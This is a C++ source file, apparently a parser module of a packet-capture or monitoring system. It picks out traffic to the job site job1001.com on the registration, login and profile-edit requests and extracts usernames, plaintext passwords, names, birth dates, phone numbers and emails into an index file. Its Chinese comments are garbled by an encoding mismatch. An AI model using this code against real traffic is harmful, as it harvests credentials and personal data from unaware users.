#include "StdAfx.h"
#include "EmployYiLanYingCai.h"

employ::YiLanYingCai::YiLanYingCai(HttpSession *http_session, const string &pro_name) : Employ(http_session,pro_name)
{
	app_ = "һ��Ӣ����";
}

employ::YiLanYingCai::~YiLanYingCai()
{
	
}

int employ::YiLanYingCai::IsYiLanYingCai(HttpSession *http_session)
{
	//ע��(����ע��)
	if((http_session->m_Requestline.m_Host.Find("www.job1001.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/personServe/2015/regdeal.php")!=-1)&&	
		(http_session->m_Requestline.m_URI.Find("/personServe/2015/regdeal.php?detail") ==-1))
	{
		return kPcWebRegisterEmail;
	}
	//��¼
	if((http_session->m_Requestline.m_Host.Find("www.job1001.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/personServe/CheckUserAjax.php")!=-1) )
	{
		return kPcWebLogin;
	}
	//�޸ĸ�����Ϣ
	if((http_session->m_Requestline.m_Host.Find("www.job1001.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/myNew/home.php?mode=resume&doaction=resumeSave&detail=basic")!=-1) )
	{
		return kPcWebModiy;
	}
	return 0;
}

int employ::YiLanYingCai::Process(const char *packet,int action)
{
	//ע��(����ע��)
	if (action == kPcWebRegisterEmail)
	{
		return PcWebRegisterEmail(packet);
	}
	//��¼
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//�޸Ļ�����Ϣ
	if (action == kPcWebModiy)
	{
		return PcWebModiy(packet);
	}
	return 1;
}

//ע��(����ע��)
int employ::YiLanYingCai::PcWebRegisterEmail(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	if (src_data.rfind("\r\n") != -1)
	{
		src_data = src_data.substr(src_data.rfind("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	string regtype = ms_->GetValueFromMapByKey("regtype");
	string p_uname = ms_->GetValueFromMapByKey("p_uname",true);
	string iname = ms_->GetValueFromMapByKey("iname",true);
	string password = ms_->GetValueFromMapByKey("password",true);
	output_text_ =
		"user="  + p_uname + "\r\n" + 		//�˺�	
		"servername=" + iname + "\r\n" + 	//����	        
		"pass=" + 	password + "\r\n"		//����
		"netmark=" + app_ + "\r\n" + 		//��Դ
		"state=ע��\r\n";
	WriteIndexFile();
 	return 1;
}

//��¼
int employ::YiLanYingCai::PcWebLogin(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//�˺�
    string UserName = ms_->GetValueFromMapByKey("uname",true);
	//����
	string Password = ms_->GetValueFromMapByKey("password",true);
	if (UserName.empty() || Password.empty())
	{
		return 0;
	}
	output_text_ =
		"user="  + UserName + "\r\n" + 	//�˺�		
		"pass=" + Password + "\r\n" + 	//����
		"netmark=" + app_ + "\r\n" + 	//��Դ
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}

//�޸Ļ�����Ϣ
int employ::YiLanYingCai::PcWebModiy(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string username  = ms_->GetValueFromMapByKey("iname",true);
	string sex = ms_->GetValueBetweenBeginEnd(src_data,"sex=","&");
	string birth = ms_->GetValueFromMapByKey("bday",true);
	string mobile = ms_->GetValueFromMapByKey("shouji",true);
	string email = ms_->GetValueFromMapByKey("email",true);
	if (username.empty() || birth.empty() || mobile.empty() || email.empty())
	{
		return 0;
	}
	output_text_=
		"servername=" + username + "\r\n" + //����	      
		"sex=" + sex + "\r\n" + 	//�Ա�	
		"msg=" + birth + "\r\n" + 	//��������	
		"oid=" + mobile + "\r\n" + 	//�ֻ���		
		"mid=" + email + "\r\n" + 	//����
		"netmark=" + app_ + "\r\n" + //��Դ
		"state=�޸Ļ�����Ϣ\r\n";
	WriteIndexFile();
	return 1;
}